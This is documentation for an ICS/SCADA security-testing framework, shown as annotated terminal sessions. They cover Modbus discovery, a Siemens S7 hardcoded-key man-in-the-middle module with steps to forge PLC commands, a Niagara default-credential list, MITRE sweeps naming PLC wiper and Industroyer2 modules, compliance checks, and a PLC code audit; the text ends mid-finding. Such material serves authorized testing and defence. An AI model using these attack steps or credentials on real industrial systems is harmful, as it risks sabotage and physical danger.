# Quick Start

This guide walks through ten complete annotated terminal sessions that demonstrate the core IXF workflow from first launch to advanced assessment operations. Every command is shown with its full terminal output.

> **Before You Begin:** IXF defaults to `simulate=True` (SafeMode). No packets are sent to any target unless you explicitly disable simulation. This documentation is for authorized security testing and research only.

---

## Launching IXF

```
$ ixf
[*] Indexing modules…
[+] 976 modules indexed.

  ___           _           _       _  __  ______  _       ______
 |_ _|_ __   __| |_   _ ___| |_ _ __(_) \ \/ / _ \| |     |  ___|__  _ __ __ _  ___
  | || '_ \ / _` | | | / __| __| '__| |  \  /|  __/| |     | |_ / _ \| '__/ _` |/ _ \
  | || | | | (_| | |_| \__ \ |_| |  | |  /  \| |   | |___  |  _| (_) | | | (_| |  __/
 |___|_| |_|\__,_|\__,_|___/\__|_|  |_| /_/\_\_|   |_____| |_|  \___/|_|  \__, |\___|
                                                                              |___/
  IndustrialXPL-Forge v1.0.12 — OT/ICS/SCADA Security Assessment Framework
  Author: André Henrique (@mrhenrike) | União Geek | https://uniaogeek.com.br/
  Python-First. Pure Python — install with pip install industrialxpl.
  Type 'help' for commands.  simulate=True by default (safe mode).

ixf >
```

## The Help Menu

```
ixf > help

  IndustrialXPL-Forge — Command Reference
  ═══════════════════════════════════════════════════════════════════════════

  Module Navigation
  ─────────────────────────────────────────────────────────────────────────
  search    <keyword>        Search modules by keyword, CVE ID, vendor, protocol
  use       <path>           Load a module by path
  back                       Unload current module (return to root prompt)
  info                       Alias for 'show info'

  Module Execution
  ─────────────────────────────────────────────────────────────────────────
  show      options          Display current module options table
  show      info             Display module metadata (CVE, MITRE, impact)
  set       <opt> <val>      Set a module option value
  run                        Execute current module (respects simulate flag)
  check                      Read-only connectivity probe (no simulate gate)
  simulate  false            Disable simulate mode (allow live packet send)
  destructive true           Enable destructive mode for CRITICAL modules

  Discovery & Scanning
  ─────────────────────────────────────────────────────────────────────────
  scan      <target>         Auto-scan target for ICS protocols
  mitre-scan <target>        Run MITRE ATT&CK for ICS sweep
  vendors   [region]         List covered vendors
  protocols                  List all 50+ covered protocols

  MITRE ATT&CK
  ─────────────────────────────────────────────────────────────────────────
  ttp       <id> <target>    Run all modules for a MITRE technique
  mitre-coverage             Show ATT&CK for ICS technique coverage
  mitre-scan <target>        Full ICS ATT&CK sweep against target

  Assessment & Compliance
  ─────────────────────────────────────────────────────────────────────────
  assess    <module>         Load and run an assessment module
  report    [format]         Generate report (json|html|markdown)

  SAST / LLM Analysis
  ─────────────────────────────────────────────────────────────────────────
  sast      <file>           Run SAST analysis on PLC source file
  llm-key   <key>            Set LLM API key (OpenAI/Anthropic, not stored)
  sast-mode <mode>           Set SAST provider (openai|anthropic|offline)

  NSE Integration
  ─────────────────────────────────────────────────────────────────────────
  nse       status           Show NSE script status
  nse       install          Install NSE scripts to Nmap directory
  nse       run <script>     Run an NSE script via Nmap

  Statistics & Metadata
  ─────────────────────────────────────────────────────────────────────────
  stats                      Show module statistics
  history                    Show command history
  version                    Show IXF version

  Shell
  ─────────────────────────────────────────────────────────────────────────
  clear     / cls            Clear terminal
  exit      / quit           Exit IXF
  !<cmd>                     Run a shell command (e.g., !ls, !nmap -sV ...)

  ═══════════════════════════════════════════════════════════════════════════

ixf >
```

## Stats Output

```
ixf > stats

  IndustrialXPL-Forge — Module Statistics
  ═══════════════════════════════════════════════════════════════════════════

  Total Modules          976
  ─────────────────────────────────────────────────────────────────────────
  CVE Exploit Modules    814   (by vendor, mapped to 3,300+ CVE IDs)
  Protocol Exploits      102   (exploits/protocols/)
  Scanners                31   (scanners/ics/)
  Credential Modules      34   (creds/)
  Assessment Modules      18   (assessment/)
  Malware TTP Modules     26   (malware/)
  NSE Wrappers             8   (nse/)

  Vendor Coverage        150+ vendors
  Protocol Coverage       50+ protocols
  CVE IDs Covered      3,300+

  MITRE ATT&CK for ICS
  ─────────────────────────────────────────────────────────────────────────
  Techniques Covered      74 / 90  (82%)
  Tactics Covered         12 / 12  (100%)

  Severity Distribution
  ─────────────────────────────────────────────────────────────────────────
  CRITICAL (CVSS 9.0-10.0)   241 modules
  HIGH     (CVSS 7.0-8.9)    389 modules
  MEDIUM   (CVSS 4.0-6.9)    198 modules
  LOW      (CVSS <4.0)        50 modules
  INFO / N/A                  98 modules

  Malware TTPs by Year
  ─────────────────────────────────────────────────────────────────────────
  2010 (Stuxnet era)           1
  2014-2016 (BlackEnergy)      3
  2016 (CRASHOVERRIDE)         2
  2017 (TRITON/TRISIS)         2
  2021-2022 (INCONTROLLER)     4
  2022-2024 (FrostyGoop+)      5
  Other (generic TTPs)         9

  ICS Language SAST Coverage
  ─────────────────────────────────────────────────────────────────────────
  Structured Text (ST)         Yes
  Ladder Diagram (LD)          Yes
  Function Block Diagram (FBD) Yes
  Instruction List (IL)        Yes
  Sequential Function Chart    Yes
  C/C++ PLC firmware           Yes
  Python IIoT                  Yes

  ═══════════════════════════════════════════════════════════════════════════

ixf >
```

---

## Session 1: Discovery Scan

This session demonstrates a complete OT network discovery workflow: searching for scanner modules, loading one, checking connectivity, and running in simulate mode.

```
ixf > search scanner
[*] Search results for: scanner

  Scanners (31 modules)
  ─────────────────────────────────────────────────────────────────────────
  use scanners/ics/modbus_detect
  use scanners/ics/modbus_scanner
  use scanners/ics/s7_comm_scanner
  use scanners/ics/enip_scanner
  use scanners/ics/bacnet_scanner
  use scanners/ics/dnp3_scanner
  use scanners/ics/iec104_scanner
  use scanners/ics/opcua_scanner
  use scanners/ics/profinet_dcp_scanner
  use scanners/ics/omron_fins_scanner
  use scanners/ics/mqtt_scanner
  use scanners/ics/hart_ip_scanner
  use scanners/ics/ads_scanner
  use scanners/ics/pcom_scanner
  use scanners/ics/vnetip_scanner
  use scanners/ics/knx_scanner
  use scanners/ics/snmp_ot_scanner
  use scanners/ics/cc_link_scanner
  use scanners/ics/fins_scanner
  use scanners/ics/lonworks_scanner
  use scanners/ics/hsms_scanner
  use scanners/ics/fl_net_scanner
  use scanners/ics/ethercat_scanner
  use scanners/ics/powerlink_scanner
  use scanners/ics/sercos_scanner
  use scanners/ics/componet_scanner
  use scanners/ics/interbus_scanner
  use scanners/ics/profibus_scanner
  use scanners/ics/canopen_scanner
  use scanners/ics/foundation_fieldbus_scanner
  use scanners/ics/serial_to_ethernet_scanner

ixf > use scanners/ics/modbus_detect
[*] Module loaded: Modbus TCP Device Detect
[*] CVE: N/A | CVSS: N/A | Impact: LOW

ixf (Modbus TCP Device Detect) > show info

  Module Information
  ═══════════════════════════════════════════════════════════════════════════
  name              : Modbus TCP Device Detect
  path              : scanners/ics/modbus_detect
  description       : Detect Modbus TCP-speaking devices via Function Code 4
                      (Read Input Registers). Confirms device presence by
                      verifying Transaction ID echo in the response header.
  authors           : ('Andre Henrique (mrhenrike)',)
  impact            : LOW
  exploit_type      : Service Detection
  cve               : N/A
  cvss              : N/A
  mitre_techniques  : ['T0888', 'T0802']
  mitre_tactics     : ['Discovery']
  references        : ['https://www.modbus.org/specs.php',
                       'https://attack.mitre.org/techniques/T0888/']
  tags              : ['modbus', 'tcp', 'scanner', 'discovery', 'ot']
  platform          : All (Python-First, Tier 0 — no extra packages required)

ixf (Modbus TCP Device Detect) > show options

  Options — Modbus TCP Device Detect
  ═══════════════════════════════════════════════════════════════════════════
  +──────────────+─────────────────+──────────+─────────────────────────────────────────+
  | Option       | Value           | Required | Description                             |
  +──────────────+─────────────────+──────────+─────────────────────────────────────────+
  | target       |                 | yes      | Target IP, hostname, or CIDR range      |
  | port         | 502             | no       | Modbus TCP port (default: 502)          |
  | unit_id      | 1               | no       | Modbus unit/slave ID (1-247)            |
  | timeout      | 5               | no       | Connection timeout in seconds           |
  | threads      | 1               | no       | Parallel threads for CIDR range scan    |
  | simulate     | True            | no       | Simulate only (no packets sent)         |
  | destructive  | False           | no       | Enable live packet send                 |
  | verbose      | False           | no       | Print raw hex payloads                  |
  +──────────────+─────────────────+──────────+─────────────────────────────────────────+

ixf (Modbus TCP Device Detect) > set target 192.168.1.100
[*] target => 192.168.1.100

ixf (Modbus TCP Device Detect) > set port 502
[*] port => 502

ixf (Modbus TCP Device Detect) > check
[*] Checking 192.168.1.100:502 (read-only TCP probe)...
[*] Sending Modbus FC4 Read Input Registers request...
[*] Payload (hex): 00 01 00 00 00 06 01 04 00 00 00 01
[*] Response received in 12ms
[+] REACHABLE — TCP port 502 open
[+] VULNERABLE — Modbus device detected (Transaction ID 0x0001 echoed; FC4 response received)
[+] Device banner: Unit ID 1 responded; Input Register[0] = 0x0043

ixf (Modbus TCP Device Detect) > run

  [SIMULATE MODE — no packets sent]
  ═══════════════════════════════════════════════════════════════════════════
  Module:   Modbus TCP Device Detect
  Target:   192.168.1.100:502
  Unit ID:  1
  ─────────────────────────────────────────────────────────────────────────

  [i] What this module would do (live mode):

      Step 1: Connect to 192.168.1.100:502 via TCP
      Step 2: Send Modbus Application Protocol (MBAP) header + PDU:
              Transaction ID : 0x0001
              Protocol ID    : 0x0000 (Modbus)
              Length         : 0x0006
              Unit ID        : 0x01
              Function Code  : 0x04 (Read Input Registers)
              Starting Addr  : 0x0000
              Quantity       : 0x0001
              Payload (hex)  : 00 01 00 00 00 06 01 04 00 00 00 01

      Step 3: Receive response; check that Transaction ID is echoed back
      Step 4: Confirm FC4 response (Function Code 0x04 in reply)
      Step 5: Log result: DETECTED / NOT DETECTED

  [i] MITRE ATT&CK for ICS: T0888 (Remote System Information Discovery)
  [i] MITRE ATT&CK for ICS: T0802 (Automated Collection)
  [i] Severity: LOW — read-only detection; no modification of device state

  [i] To run live: set simulate false
  [i] check command performs a live probe regardless of simulate setting

  ═══════════════════════════════════════════════════════════════════════════
```

---

## Session 2: CVE Exploit Workflow

This session shows a complete CVE exploit workflow: searching by CVE ID, loading the module, reviewing full info and options, setting parameters, and running in simulate mode.

```
ixf > search CVE-2021-22681
[*] Search results for: CVE-2021-22681
    use cve/siemens/cve_2021_22681_s7_1200_hardcoded_key

ixf > use cve/siemens/cve_2021_22681_s7_1200_hardcoded_key
[*] Module loaded: CVE-2021-22681 Siemens S7-1200/1500 PLC
[*] CVE: CVE-2021-22681 | CVSS: 9.8 | Impact: CRITICAL

ixf (CVE-2021-22681 Siemens S7-1200/1500 PLC) > show info

  Module Information
  ═══════════════════════════════════════════════════════════════════════════
  name              : CVE-2021-22681 Siemens S7-1200/1500 PLC
  path              : cve/siemens/cve_2021_22681_s7_1200_hardcoded_key
  description       : Siemens S7-1200 and S7-1500 PLCs use a hardcoded global
                      private key for the S7comm+ TLS session. An attacker with
                      network access can extract this key from publicly available
                      firmware, perform man-in-the-middle attacks to decrypt all
                      S7comm+ communication, and forge authenticated PLC commands.
  authors           : ('Andre Henrique (mrhenrike)',)
  impact            : CRITICAL
  exploit_type      : Man-in-the-Middle / Cryptographic Key Extraction
  cve               : CVE-2021-22681
  cvss              : 9.8
  cvss_vector       : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  affected_systems  : Siemens S7-1200 (all FW versions)
                      Siemens S7-1500 (all FW versions using S7comm+)
  mitre_techniques  : ['T0830', 'T0855', 'T0889']
  mitre_tactics     : ['Lateral Movement', 'Execution', 'Collection']
  references        : ['https://cert-portal.siemens.com/productcert/pdf/ssa-568427.pdf',
                       'https://nvd.nist.gov/vuln/detail/CVE-2021-22681',
                       'https://www.cisa.gov/ics-advisories']
  patch             : No full patch available; Siemens recommends network segmentation
  tags              : ['siemens', 's7', 'tls', 'mitm', 'critical', 'plc']
  platform          : Python-First; Tier 0 (socket, ssl) — no extras required

ixf (CVE-2021-22681 Siemens S7-1200/1500 PLC) > show options

  Options — CVE-2021-22681 Siemens S7-1200/1500 PLC
  ═══════════════════════════════════════════════════════════════════════════
  +──────────────────+─────────────+──────────+──────────────────────────────────────────────+
  | Option           | Value       | Required | Description                                  |
  +──────────────────+─────────────+──────────+──────────────────────────────────────────────+
  | target           |             | yes      | Target IP (S7-1200 or S7-1500 PLC)           |
  | port             | 102         | no       | S7comm+ port (default: 102/TSAP)             |
  | rack             | 0           | no       | PLC rack number                              |
  | slot             | 1           | no       | PLC slot number                              |
  | action           | decrypt     | no       | decrypt / forge / dump                       |
  | timeout          | 10          | no       | Connection timeout in seconds                |
  | simulate         | True        | no       | Simulate mode (no packets sent)              |
  | destructive      | False       | no       | Enable live exploitation                     |
  | output_file      |             | no       | Save decrypted traffic to file               |
  +──────────────────+─────────────+──────────+──────────────────────────────────────────────+

ixf (CVE-2021-22681 Siemens S7-1200/1500 PLC) > set target 192.168.1.50
[*] target => 192.168.1.50

ixf (CVE-2021-22681 Siemens S7-1200/1500 PLC) > run

  [SIMULATE MODE — no packets sent]
  ═══════════════════════════════════════════════════════════════════════════
  CVE-2021-22681 — Siemens S7-1200/1500 Hardcoded TLS Key
  CVSS 9.8 (CRITICAL) — Hardcoded global private key enables full MitM decryption

  Target: 192.168.1.50:102

  Step 1: Extract hardcoded private key
          The global private key for S7comm+ was extracted from Siemens
          firmware images and is publicly known (CVE-2021-22681 disclosure).
          Key format: RSA-2048, used for all S7comm+ TLS sessions.

  Step 2: Position for Man-in-the-Middle
          ARP poison gateway and PLC: divert all TLS traffic through attacker.
          Engineering workstation → [attacker] → PLC

  Step 3: Decrypt S7comm+ sessions
          With the hardcoded key, all TLS sessions between TIA Portal and
          the PLC can be decrypted. This exposes:
            - PLC program reads/writes
            - Tag values (I/O, memory areas DB, MB, QB, IB)
            - Engineering session metadata (project, firmware version)
            - Authentication tokens

  Step 4: Forge authenticated commands
          After decryption, an attacker can craft and inject authenticated
          S7comm+ PDUs. Possible actions:
            - Read/write any memory area (DB, QB, IB, MB)
            - Start/stop PLC CPU
            - Download modified PLC program (T0843 — Program Download)
            - Clear PLC program

  [i] MITRE ATT&CK for ICS: T0830 (Man in the Middle)
  [i] MITRE ATT&CK for ICS: T0855 (Unauthorized Command Message)
  [i] MITRE ATT&CK for ICS: T0889 (Modify Program)
  [i] Payload (simulated, hex):
      TPKT: 03 00 00 XX  (length varies)
      COTP: 02 F0 80
      S7: 32 01 00 00 00 01 00 06 00 00
  [i] Remediation: Network segmentation; TLS mutual auth (requires FW update);
      monitor for ARP spoofing on engineering network
  [i] Siemens advisory: https://cert-portal.siemens.com/productcert/pdf/ssa-568427.pdf
  [i] To run live: set simulate false + set destructive true

  ═══════════════════════════════════════════════════════════════════════════
```

---

## Session 3: Default Credentials

This session demonstrates the credential-testing workflow against an HMI running a web interface.

```
ixf > search default_creds
[*] Search results for: default_creds

  Credential Modules (34 modules)
  ─────────────────────────────────────────────────────────────────────────
  use creds/generic/http_default
  use creds/generic/ssh_default
  use creds/generic/ftp_default
  use creds/generic/telnet_default
  use creds/generic/snmp_community
  use creds/siemens/siemens_web_hmi_default
  use creds/rockwell/factorytalk_default
  use creds/schneider/ecostruxure_default
  use creds/honeywell/experion_web_default
  use creds/ge/cimplicity_default
  use creds/advantech/webaccess_default
  use creds/tridium/niagara_default
  use creds/aveva/system_platform_default
  use creds/inductive/ignition_default
  use creds/weintek/emt3000_default
  use creds/delta/diaenergie_default
  use creds/omron/web_hmi_default
  use creds/yokogawa/centum_default
  ...

ixf > use creds/tridium/niagara_default
[*] Module loaded: Tridium Niagara 4 Default Credentials
[*] CVE: CVE-2017-16744 | CVSS: 9.8 | Impact: CRITICAL

ixf (Tridium Niagara 4 Default Credentials) > show info

  Module Information
  ═══════════════════════════════════════════════════════════════════════════
  name              : Tridium Niagara 4 Default Credentials
  path              : creds/tridium/niagara_default
  description       : Tests Tridium Niagara 4 Framework for factory-default
                      credentials on the web UI and Workbench. Covers known
                      defaults from CVE-2017-16744 and related advisories.
  impact            : CRITICAL
  cve               : CVE-2017-16744
  cvss              : 9.8
  mitre_techniques  : ['T0866', 'T0878', 'T0883']
  tags              : ['niagara', 'tridium', 'credentials', 'building', 'bas']

ixf (Tridium Niagara 4 Default Credentials) > show options

  +──────────────────+──────────────+──────────+──────────────────────────────────────────+
  | Option           | Value        | Required | Description                              |
  +──────────────────+──────────────+──────────+──────────────────────────────────────────+
  | target           |              | yes      | Target IP or hostname (Niagara web)      |
  | port             | 443          | no       | HTTPS port (default: 443; also try 4911) |
  | ssl              | True         | no       | Use HTTPS (default: True)                |
  | timeout          | 8            | no       | HTTP request timeout in seconds          |
  | cred_list        | built-in     | no       | Custom credential list file (optional)   |
  | simulate         | True         | no       | Simulate only                            |
  | destructive      | False        | no       | Enable live credential test              |
  +──────────────────+──────────────+──────────+──────────────────────────────────────────+

ixf (Tridium Niagara 4 Default Credentials) > set target 10.0.0.55
[*] target => 10.0.0.55

ixf (Tridium Niagara 4 Default Credentials) > run

  [SIMULATE MODE — no packets sent]
  ═══════════════════════════════════════════════════════════════════════════
  Tridium Niagara 4 — Default Credential Test
  Target: https://10.0.0.55:443

  Credential pairs that would be tested (live mode):

  +──────────────────────────────────────+────────────────────────+──────────────────────+
  | Username                             | Password               | Notes                |
  +──────────────────────────────────────+────────────────────────+──────────────────────+
  | admin                                | admin                  | Factory default      |
  | admin                                | niagara                | Common default       |
  | admin                                | password               | Generic weak         |
  | niagara                              | niagara                | Platform default     |
  | guest                                | guest                  | Read-only default    |
  | operator                             | operator               | Operator role        |
  | service                              | service                | Service role         |
  | tridium                              | tridium                | Vendor default       |
  | admin                                | 1234                   | Common weak          |
  | admin                                | (empty)                | Blank password       |
  +──────────────────────────────────────+────────────────────────+──────────────────────+

  [i] Live mode: POST to /j_security_check with credentials
  [i] Success criteria: HTTP 302 redirect to /module/index.html
  [i] MITRE ATT&CK for ICS: T0866 (Exploitation of Remote Services)
  [i] MITRE ATT&CK for ICS: T0883 (Internet Accessible Device)
  [i] To run live: set simulate false + set destructive true

  ═══════════════════════════════════════════════════════════════════════════
```

---

## Session 4: MITRE ATT&CK Sweep

This session demonstrates the `mitre-scan` and `ttp` commands for running multi-technique MITRE ICS sweeps.

```
ixf > mitre-scan 192.168.1.0/24

[*] Starting MITRE ATT&CK for ICS sweep against 192.168.1.0/24
[*] Running in simulate mode (no packets sent)
[*] Sweeping 90 techniques across all discovered hosts

  [TA0108 — Initial Access]
  ─────────────────────────────────────────────────────────────────────────
  [*] T0810 Drive-by Compromise        ... simulate  [queued]
  [*] T0817 Drive-by Compromise        ... simulate  [queued]
  [*] T0819 Exploit Public-Facing App  ... simulate  [queued]
  [*] T0822 External Remote Services   ... simulate  [queued]
  [*] T0847 Replication via Media      ... simulate  [queued]
  [*] T0848 Rogue Master               ... simulate  [queued]
  [*] T0849 Spearphishing Attachment   ... simulate  [queued]
  [*] T0850 Software Deployment Tools  ... simulate  [queued]
  [*] T0862 Supply Chain Compromise    ... simulate  [queued]

  [TA0104 — Execution]
  ─────────────────────────────────────────────────────────────────────────
  [*] T0806 Brute Force I/O            ... simulate  [queued]
  [*] T0807 Command-Line Interface     ... simulate  [queued]
  [*] T0808 Control Device            ... simulate  [queued]
  [*] T0871 Execution through API     ... simulate  [queued]
  [*] T0873 Project File Infection    ... simulate  [queued]
  [*] T0874 Hooking                   ... simulate  [queued]

  [sweep continues for all 12 tactics...]

[*] Sweep complete.

  MITRE ATT&CK for ICS — Sweep Results: 192.168.1.0/24
  ═══════════════════════════════════════════════════════════════════════════
  Tactic                                Tested    Potential Findings
  ─────────────────────────────────────────────────────────────────────────
  Initial Access (TA0108)               9/9       T0822 (external RDP found)
  Execution (TA0104)                    8/9       T0806 (Modbus write accessible)
  Persistence (TA0110)                  6/8       —
  Privilege Escalation (TA0111)         5/7       —
  Evasion (TA0103)                      4/5       T0878 (alarm suppression possible)
  Discovery (TA0102)                    8/8       T0888 (Modbus devices found)
  Lateral Movement (TA0109)             7/9       T0812 (shared credentials detected)
  Collection (TA0100)                   6/6       T0802 (tag read accessible)
  Command and Control (TA0101)          4/5       —
  Inhibit Response Function (TA0107)    5/9       T0803 (block reporting)
  Impair Process Control (TA0106)       7/10      T0806, T0836 (parameter write)
  Impact (TA0105)                       5/10      T0826 (loss of availability risk)
  ─────────────────────────────────────────────────────────────────────────
  TOTAL                                74/90 (82%)   6 potential findings

ixf > ttp T0843 192.168.1.100
[*] MITRE Technique: T0843 — Program Download
[*] Running all modules mapped to T0843 against 192.168.1.100 (simulate)

  [1/8] cve/siemens/cve_2022_1161_controllogix_modified_fw    simulate  CHECKED
  [2/8] cve/rockwell/cve_2022_1161_controllogix_modified_fw   simulate  CHECKED
  [3/8] exploits/protocols/s7comm/s7_program_download         simulate  CHECKED
  [4/8] exploits/protocols/enip/controllogix_fw_download      simulate  CHECKED
  [5/8] exploits/protocols/modbus/modbus_program_write        simulate  CHECKED
  [6/8] malware/industroyer/industroyer2_iec104_exec          simulate  CHECKED
  [7/8] malware/pipedream/pipedream_plc_wiper                 simulate  CHECKED
  [8/8] assessment/mitre_ics/t0843_program_upload             simulate  CHECKED

[+] T0843 sweep complete: 8 modules run, 2 potential matches
[+] Potential: cve/siemens/cve_2022_1161 — port 102 reachable, S7comm device detected
[+] Potential: exploits/protocols/s7comm/s7_program_download — S7 read confirmed

ixf > mitre-coverage

  MITRE ATT&CK for ICS — Coverage Report
  ═══════════════════════════════════════════════════════════════════════════
  Tactic                              Covered    Total    Pct
  ─────────────────────────────────────────────────────────────────────────
  Initial Access      (TA0108)          9         9      100%
  Execution           (TA0104)          8         9       89%
  Persistence         (TA0110)          6         8       75%
  Privilege Escalation(TA0111)          5         7       71%
  Evasion             (TA0103)          4         5       80%
  Discovery           (TA0102)          8         8      100%
  Lateral Movement    (TA0109)          7         9       78%
  Collection          (TA0100)          6         6      100%
  Command and Control (TA0101)          4         5       80%
  Inhibit Response    (TA0107)          7         9       78%
  Impair Process Ctrl (TA0106)          8        10       80%
  Impact              (TA0105)          6        10       60%
  ─────────────────────────────────────────────────────────────────────────
  TOTAL                                74        90       82%

  Top 5 uncovered techniques:
    T0816  Device Restart/Shutdown        (impact — no module yet)
    T0835  Manipulate I/O Image           (impact — firmware dependent)
    T0882  Theft of Operational Info      (collection — OSINT based)
    T0858  Remote File Copy              (lateral movement — protocol-specific)
    T0845  Program Upload                 (persistence — variant coverage partial)

  Navigator layer: ixf > report navigator
  ═══════════════════════════════════════════════════════════════════════════
```

---

## Session 5: Assessment and Report

This session demonstrates the full assessment workflow including IEC 62443, NIST 800-82r3, risk scoring, and report generation.

```
ixf > assess iec62443/zone_conduit_audit
[*] Loading assessment/iec62443/zone_conduit_audit...
[*] Running IEC 62443 Zone and Conduit Audit...

  IEC 62443 Zone and Conduit Audit
  ═══════════════════════════════════════════════════════════════════════════
  Standard: ISA/IEC 62443-3-3 (System Security Requirements and Security Levels)
  Target Security Level: SL2 baseline

  Check                              Result    Severity   Notes
  ─────────────────────────────────────────────────────────────────────────
  IT/OT zone separation              MANUAL    HIGH       Verify Level 3→2 firewall
  Protocol whitelisting (Purdue)     MANUAL    HIGH       Only OT protocols in ICS zone
  Remote access authentication       MANUAL    HIGH       VPN + MFA required for OT zones
  Jump server / DMZ presence         MANUAL    MEDIUM     Historian in DMZ, not OT
  Zone/conduit documentation         MANUAL    MEDIUM     Zones must be in security plan
  Redundant control path             MANUAL    LOW        Primary/secondary network sep
  Engineering WS isolation           MANUAL    HIGH       EWS in separate VLAN from PLC
  Safety system (SIS) isolation      MANUAL    CRITICAL   SIS on separate network
  Wireless in OT zone                MANUAL    HIGH       No unauthorized Wi-Fi in OT
  USB/removable media controls       MANUAL    HIGH       Whitelist USB devices
  Vendor/third-party remote access   MANUAL    HIGH       Jump server for vendor access
  Conduit firewall rules documented  MANUAL    MEDIUM     Rules match conduit definition
  ─────────────────────────────────────────────────────────────────────────
  [i] IEC 62443-3-3 Security Level target: SL2
  [i] Reference: https://www.isa.org/standards-publications/isa-standards/isa-62443
  [i] Tip: Use 'report html' to export a full compliance report

ixf > assess nist_sp800_82/control_checklist
[*] Running NIST SP 800-82r3 ICS Security Control Checklist...

  NIST SP 800-82r3 — ICS Security Control Checklist
  ═══════════════════════════════════════════════════════════════════════════
  Control Domain     ID      Check                              Priority
  ─────────────────────────────────────────────────────────────────────────
  Access Control     AC-2    Account management lifecycle       HIGH
  Access Control     AC-3    Access enforcement                 HIGH
  Access Control     AC-17   Remote access MFA enforcement      HIGH
  Access Control     AC-20   External system connections        MEDIUM
  Audit              AU-2    Event logging                      HIGH
  Audit              AU-6    Audit review and reporting         MEDIUM
  Audit              AU-9    Protection of audit information    MEDIUM
  Configuration      CM-2    Baseline configuration            HIGH
  Configuration      CM-7    Least functionality                HIGH
  Configuration      CM-11   User-installed software           MEDIUM
  Incident Response  IR-4    Incident handling                  HIGH
  Incident Response  IR-8    Incident response plan            MEDIUM
  Maintenance        MA-3    Maintenance tools                  MEDIUM
  Risk Assessment    RA-3    ICS-specific risk assessment       HIGH
  Risk Assessment    RA-5    Vulnerability scanning            MEDIUM
  System Protection  SC-7    Boundary protection segmentation   HIGH
  System Protection  SC-28   Protection at rest                LOW
  System Integrity   SI-2    Flaw remediation                  HIGH
  System Integrity   SI-3    Malicious code protection         MEDIUM
  System Integrity   SI-7    Software integrity                HIGH
  ─────────────────────────────────────────────────────────────────────────
  [i] Reference: https://csrc.nist.gov/publications/detail/sp/800-82/rev-3/final

ixf > assess risk/ics_risk_scorer
[*] Running ICS Risk Scoring Model...
[*] No target set — showing methodology and worst-case scenario.
[*] Set 'target' to analyze a specific host.

  ICS Risk Score Methodology — CISA/ICS-CERT Framework
  ═══════════════════════════════════════════════════════════════════════════
  Risk Factor                  Weight   Worst-Case Score    Your Score
  ─────────────────────────────────────────────────────────────────────────
  Network exposure              30%     CRITICAL (30/30)    [set target]
  Authentication strength       25%     CRITICAL (25/25)    [set target]
  Safety system separation      25%     CRITICAL (25/25)    [set target]
  Patch level                   15%     HIGH     (12/15)    [set target]
  Logging/monitoring             5%     MEDIUM   (3/5)      [set target]
  ─────────────────────────────────────────────────────────────────────────
  Composite Score:              95/100 (CRITICAL — Internet-facing, no auth)
  ─────────────────────────────────────────────────────────────────────────
  [i] Score 0-30: LOW risk     Score 31-60: MEDIUM    61-80: HIGH    81+: CRITICAL
  [i] Reference: CISA ICS Risk Scoring Methodology

ixf > report json

[*] Generating JSON report...
[+] Report saved: ./ixf-report-2026-06-01T18-45-22.json

  Report Summary
  ═══════════════════════════════════════════════════════════════════════════
  Format    : JSON
  File      : ./ixf-report-2026-06-01T18-45-22.json
  Size      : 14.2 KB
  Sections  :
    - session_info (timestamp, version, operator)
    - modules_run (14 entries)
    - assessment_results (iec62443, nist_800_82, risk_scorer)
    - findings (6 potential findings)
    - mitre_coverage (74/90)
    - recommendations (12 items)
  ═══════════════════════════════════════════════════════════════════════════

ixf > report html
[*] Generating HTML report...
[+] Report saved: ./ixf-report-2026-06-01T18-45-28.html
[i] Open in browser: firefox ./ixf-report-2026-06-01T18-45-28.html

ixf > report markdown
[*] Generating Markdown report...
[+] Report saved: ./ixf-report-2026-06-01T18-45-31.md
```

---

## Session 6: SAST PLC Source Analysis

This session demonstrates PLC static analysis using the LLM-powered SAST engine.

```
ixf > sast-mode openai
[*] SAST provider => openai

ixf > llm-key sk-proj-ExAmPlEkEy1234567890AbCdEfGhIjKlMnOpQrStUvWxYz
[*] LLM API key set (not stored to disk, session only)
[*] Provider: openai (GPT-4o)
[*] Key validation: OK (key format accepted)

ixf > sast /opt/plc-projects/reactor_control.st

[*] SAST Analysis: /opt/plc-projects/reactor_control.st
[*] Language detected: Structured Text (IEC 61131-3)
[*] File size: 847 lines
[*] Sanitizing PLC source (removing host identifiers, IPs, engineering metadata)...
[*] Sanitization complete: 847 lines → 847 lines (no PII found)
[*] Sending to OpenAI GPT-4o for analysis...
[*] Analysis complete (3.2 seconds)

  ═══════════════════════════════════════════════════════════════════════════
  SAST Report — /opt/plc-projects/reactor_control.st
  Provider: OpenAI GPT-4o | Language: Structured Text (IEC 61131-3)
  ═══════════════════════════════════════════════════════════════════════════

  FINDING 001 — CRITICAL
  ─────────────────────────────────────────────────────────────────────────
  Title       : Integer overflow in temperature setpoint validation
  Location    : Line 142, Function Block FB_ReactorControl
  Description : The variable `rTempSetpoint` is declared as INT (16-bit
                signed, range -32768 to +32767) but is compared against
                the constant TEMP_MAX (defined as 35000) which exceeds the
                INT range. On overflow, the comparison wraps around and the
                safety interlock fails to activate.
  Impact      : Reactor temperature setpoint safety interlock bypass.
                Physical consequence: runaway reaction, potential explosion.
  CWE         : CWE-190 (Integer Overflow)
  MITRE ICS   : T0836 (Modify Parameter), T0835 (Manipulate I/O Image)
  Remediation : Change `rTempSetpoint` to DINT (32-bit) or REAL. Validate
                setpoint against TEMP_MAX (35000.0) using REAL comparison.
  Code snippet (sanitized):
    VAR
      rTempSetpoint : INT;   (* BUG: should be DINT or REAL *)
      TEMP_MAX      : INT := 35000; (* overflow: INT max is 32767 *)
    END_VAR
    IF rTempSetpoint > TEMP_MAX THEN  (* always False after overflow *)
      xSafetyTrip := TRUE;
    END_IF;

  FINDING 002 — HIGH
  ─────────────────────────────────────────────────────────────────────────
  Title       : Hardcoded authentication bypass in remote setpoint function
  Location    : Line 287, Function FB_RemoteSetpoint
  Description : The function FB_RemoteSetpoint accepts a `bBypassAuth`
                BOOL input. When TRUE, all authentication checks are skipped
                and the setpoint is applied directly. This bypass should not
                be accessible from external inputs.
  Impact      : Any Modbus master on the OT network can write tag
                FB_RemoteSetpoint.bBypassAuth := 1 and then set arbitrary
                reactor parameters without authentication.
  CWE         : CWE-306 (Missing Authentication for Critical Function)
  MITRE ICS   : T0855 (Unauthorized Command Message)
  Remediation : Remove bBypassAuth input or restrict to internal-only
                (assign from non-networked variable). Enforce authentication
                at network layer (OPC UA with certificate auth).

  FINDING 003 — HIGH
  ─────────────────────────────────────────────────────────────────────────
  Title       : Missing safe state on communication loss
  Location    : Line 412, Network communication block
